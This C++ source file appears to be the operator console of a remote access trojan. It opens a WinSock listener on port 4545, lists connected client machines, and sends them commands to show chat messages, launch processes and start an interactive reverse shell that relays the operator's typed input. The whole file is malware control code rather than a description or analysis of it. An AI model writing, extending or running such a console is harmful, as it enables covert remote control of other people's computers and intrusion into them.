#include <iostream>

#include "Trace.h"
#include "Entrypoint.h"
#include "ICommunicationFactory.h"
#include "IRatManager.h"

Entrypoint::Entrypoint()
	:
	_factory(CreateFactory()),
	_manager(
		CreateRatManager(
			_factory.get(),
			_factory->CreateWinSockConnectionListener(4545)))
{
	Startup();

	while (true)
	{
		ParseInput();

		if (_commands.contains(_command))
		{
			try
			{
				_commands[_command]();
			}
			catch(...)
			{
				Trace("Failed to execute command");
			}
		}
		else
		{
			Trace("Command unknown\n");
		}

		Trace("\n> ");
	}
}

void Entrypoint::Startup()
{
	_commands["c"] = [this] { SendChatMessage(); };
	_commands["chat"] = [this] { SendChatMessage(); };
	_commands["p"] = [this] { SendCreateProcess(); };
	_commands["process"] = [this] { SendCreateProcess(); };
	_commands["r"] = [this] { SendReverseShell(); };
	_commands["reverse"] = [this] { SendReverseShell(); };
	_commands["l"] = [this] { ListClients(); };
	_commands["list"] = [this] { ListClients(); };

	Trace("> ");
}

void Entrypoint::SendChatMessage()
{
	const int pos = _args.find(' ');

	auto str = _args.substr(0, pos);
	const int client = std::stoi(str);
	std::string message = _args.substr(pos + 1);

	_manager->Send(
		client,
		MessageType::Chat,
		std::span(const_cast<char*>(
			          message.c_str()),
		          message.size()));
}

void Entrypoint::SendCreateProcess()
{
	const int pos = _args.find(' ');

	auto str = _args.substr(0, pos);
	const int client = std::stoi(str);
	std::string message = _args.substr(pos + 1);

	_manager->Send(
		client,
		MessageType::CreateProcessS,
		std::span(const_cast<char*>(
			message.c_str()),
			message.size()));
}

void Entrypoint::SendReverseShell()
{
	const int pos = _args.find(' ');

	auto str = _args.substr(0, pos);
	const int client = std::stoi(str);
	std::string message = _args.substr(pos + 1);

	_manager->Send(
		client,
		MessageType::StartReverseShell,
		std::span(const_cast<char*>(
			message.c_str()),
			message.size()));

	while (true)
	{
		std::string input;
		std::getline(std::cin, input);

		if (input == "exit")
		{
			_manager->Send(
				client,
				MessageType::StopReverseShell,
				std::span(const_cast<char*>(
					input.c_str()),
					input.size()));
			break;
		}

		_manager->Send(
			client,
			MessageType::ReverseShellMessage,
			std::span(const_cast<char*>(
				input.c_str()),
				input.size()));
	}
}

void Entrypoint::ListClients() const
{
	int i = 0;
	for (const auto& clientPipe : _manager->GetClients())
	{
		Trace("Client %d: %s\n", i, clientPipe->GetConnection()->GetAddress().c_str());
		i++;
	}
}

void Entrypoint::ParseInput()
{
	std::string input;
	std::getline(std::cin, input);

	const int pos = input.find(' ');

	_command = input.substr(0, pos);
	_args = input.substr(pos + 1);
}
